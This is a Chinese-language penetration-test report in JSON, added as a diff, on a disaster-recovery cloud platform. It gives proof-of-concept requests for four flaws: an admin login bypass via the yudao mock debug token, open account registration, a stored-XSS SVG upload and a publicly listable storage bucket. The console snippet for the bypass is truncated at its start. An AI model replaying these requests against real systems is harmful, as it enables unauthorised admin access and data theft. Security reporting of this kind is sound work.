@@ -1,0 +1,267 @@
+{
+  "项目名称": "尧天灾备云",
+  "报告日期": "2026年11月",
+  "系统名称": "尧天灾备云",
+  "系统地址": "https://URLXXX/login?redirect=/index",
+  "系统备注": "",
+  "系统数量": "1",
+  "严重数量": "0",
+  "高危数量": "1",
+  "中危数量": "2",
+  "低危数量": "1",
+  "漏洞合计": "4",
+  "总体危险程度": "高危",
+  "漏洞列表": [
+    {
+      "编号": "1",
+      "名称": "未授权登录管理员",
+      "等级": "高危",
+      "描述": [
+        {
+          "段落": "系统认证过滤器开启了 mock 调试身份，且未校验 token 签名、来源与登录态。攻击者无需任何账号密码，只需在请求头中携带 Authorization: Bearer test1 与 tenant-id: 1，即可被系统识别为超级管理员 admin（userId=1），直接进入管理后台。"
+        },
+        {
+          "段落": "该漏洞无需任何前置凭据，也可通过浏览器注入本地缓存 token 直接登录后台首页；登录后可读取用户数据、访问系统管理功能，并具备创建用户、修改配置、分配角色等管理权限。"
+        }
+      ],
+      "影响范围": "https://URLXXX",
+      "漏洞地址": "https://URLXXX/login?redirect=/index",
+      "详情": [
+        {
+          "段落": "目标主机开启了 yudao 的 mock 开发调试模式且 mockSecret 使用框架默认值 test。未认证攻击者只需构造："
+        },
+        {
+          "段落": "Authorization: Bearer test1"
+        },
+        {
+          "段落": "tenant-id: 1"
+        },
+        {
+          "段落": "即可让 TokenAuthenticationFilter 把 token 剩余部分当作 userId，直接建立登录态，无需任何账号、口令、验证码或签名。"
+        },
+        {
+          "段落": "获取账号信息GET /dev/admin-api/system/user/page?pageNo=1&pageSize=1 HTTP/1.1"
+        },
+        {
+          "段落": "Host: URLXXX"
+        },
+        {
+          "段落": "Accept: application/json"
+        },
+        {
+          "段落": "Authorization: Bearer test1"
+        },
+        {
+          "段落": "tenant-id: 1"
+        },
+        {
+          "段落": "User-Agent: Mozilla/5.0"
+        },
+        {
+          "段落": "Connection: close"
+        },
+        {
+          "段落": "获取配置信息"
+        },
+        {
+          "段落": "GET /dev/admin-api/system/auth/get-permission-info HTTP/1.1"
+        },
+        {
+          "段落": "Host: URLXXX"
+        },
+        {
+          "段落": "Accept: application/json"
+        },
+        {
+          "段落": "Authorization: Bearer test1"
+        },
+        {
+          "段落": "tenant-id: 1"
+        },
+        {
+          "段落": "User-Agent: Mozilla/5.0"
+        },
+        {
+          "段落": "Connection: close"
+        },
+        {
+          "段落": "打开 https://URLXXX/login页面，之后F12选择 Console，执行："
+        },
+        {
+          "段落": "QWUTC').getTime(),w=v=>JSON.stringify({c:Date.now(),e,v:JSON.stringify(v)});localStorage.setItem('ACCESS_TOKEN',w('test1'));localStorage.setItem('REFRESH_TOKEN',w('test1'));localStorage.setItem('tenantId',w(1));location.href='/index';})()"
+        },
+        {
+          "段落": "即可加载后台首页。"
+        }
+      ],
+      "建议": [
+        {
+          "段落": "1.添加权限校验，禁止未授权登录管理员，同时校验用户身份与请求身份一致。"
+        }
+      ],
+      "截图": []
+    },
+    {
+      "编号": "2",
+      "名称": "未授权注册任意用户",
+      "等级": "低危",
+      "描述": [
+        {
+          "段落": "该应用存在任意用户注册漏洞，允许未经验证的攻击者注册任意账号。此漏洞源于应用对用户注册信息的验证机制不完善，导致攻击者能够绕过正常注册流程，通过修改请求包或绕过客户端验证，实现任意账号的注册。"
+        }
+      ],
+      "影响范围": "https://URLXXX",
+      "漏洞地址": "https://URLXXX/dev/admin-api/system/auth/register",
+      "详情": [
+        {
+          "段落": "访问注册接口，提交请求"
+        },
+        {
+          "段落": "POST /dev/admin-api/system/auth/register HTTP/1.1"
+        },
+        {
+          "段落": "Host: URLXXX"
+        },
+        {
+          "段落": "User-Agent: Mozilla/5.0"
+        },
+        {
+          "段落": "tenant-id: 1"
+        },
+        {
+          "段落": "Content-Type: application/json"
+        },
+        {
+          "段落": "Content-Length: 77"
+        },
+        {
+          "段落": "Connection: close"
+        },
+        {
+          "段落": "{\"username\":\"qaprobex1\",\"password\":\"Qa123456\",\"nickname\":\"qa\",\"tenantId\":1}"
+        },
+        {
+          "段落": "查看用户，注册成功"
+        }
+      ],
+      "建议": [
+        {
+          "段落": "1.添加访问控制，禁止未授权访问注册接口。"
+        }
+      ],
+      "截图": []
+    },
+    {
+      "编号": "3",
+      "名称": "任意文件上传",
+      "等级": "中危",
+      "描述": [
+        {
+          "段落": "文件上传漏洞是指 Web 服务器允许用户将文件上传至其文件系统，但这些文件可能并没有经过充分的验证，如文件名称、类型、内容或大小等。未能正确执行这些限制就意味着即使最基本的图像上传功能也可能用于上传任意具有潜在危险的文件，里面甚至包括远程代码执行的服务器端脚本文件，严重的可控制服务器执行任意命令。"
+        }
+      ],
+      "影响范围": "https://URLXXX",
+      "漏洞地址": "https://URLXXX/dev/admin-api/infra/file/upload",
+      "详情": [
+        {
+          "段落": "后台上传文件接口，上传svg文件"
+        },
+        {
+          "段落": "POST /dev/admin-api/infra/file/upload HTTP/1.1"
+        },
+        {
+          "段落": "Host: URLXXX"
+        },
+        {
+          "段落": "User-Agent: Mozilla/5.0"
+        },
+        {
+          "段落": "tenant-id: 1"
+        },
+        {
+          "段落": "Authorization: Bearer c67942f16f404611a9c5aeb32b206f58"
+        },
+        {
+          "段落": "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQA7xK2mP"
+        },
+        {
+          "段落": "Content-Length: 244"
+        },
+        {
+          "段落": "Connection: close"
+        },
+        {
+          "段落": "------WebKitFormBoundaryQA7xK2mP"
+        },
+        {
+          "段落": "Content-Disposition: form-data; name=\"file\"; filename=\"qa_probe.svg\""
+        },
+        {
+          "段落": "Content-Type: image/svg+xml"
+        },
+        {
+          "段落": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"
+        },
+        {
+          "段落": "------WebKitFormBoundaryQA7xK2mP--"
+        },
+        {
+          "段落": "上传成功，访问触发存储型XSS漏洞"
+        }
+      ],
+      "建议": [
+        {
+          "段落": "1.允许扩展名的白名单而不是禁止扩展名的黑名单来检查文件扩展名。"
+        },
+        {
+          "段落": "2.集成ClamAV等杀毒引擎对上传的文件进行扫描，防止存储型XSS漏洞。"
+        }
+      ],
+      "截图": []
+    },
+    {
+      "编号": "4",
+      "名称": "存储桶文件遍历",
+      "等级": "中危",
+      "描述": [
+        {
+          "段落": "存储桶配置了公开的list权限，访问接口即可查看存储桶所有已上传文件，获取文件中的敏感信息。"
+        }
+      ],
+      "影响范围": "https://URLXXX",
+      "漏洞地址": "http://URLXXX:9000/dr-bucket",
+      "详情": [
+        {
+          "段落": "GET /dr-bucket HTTP/1.1"
+        },
+        {
+          "段落": "Host: URLXXX:9000"
+        },
+        {
+          "段落": "User-Agent: Mozilla/5.0"
+        },
+        {
+          "段落": "Accept: */*"
+        },
+        {
+          "段落": "Connection: close"
+        },
+        {
+          "段落": "拼接路径，访问任意文件"
+        },
+        {
+          "段落": "http://URLXXX:9000/dr-bucket/20260428/%E5%AE%9A%E6%97%B6--CBUR%E7%81%BE%E5%A4%87%E7%B3%BB%E7%BB%9F%E7%BB%B4%E6%8A%A4%E6%93%8D%E4%BD%9C%E7%99%BD%E7%9A%AE%E4%B9%A6_1777346526135.pdf"
+        }
+      ],
+      "建议": [
+        {
+          "段落": "1.更改存储桶配置，进行直接列出所有文件名。"
+        },
+        {
+          "段落": "2.添加访问权限，禁止访问根路径查看文件名"
+        }
+      ],
+      "截图": []
+    }
+  ]
+}
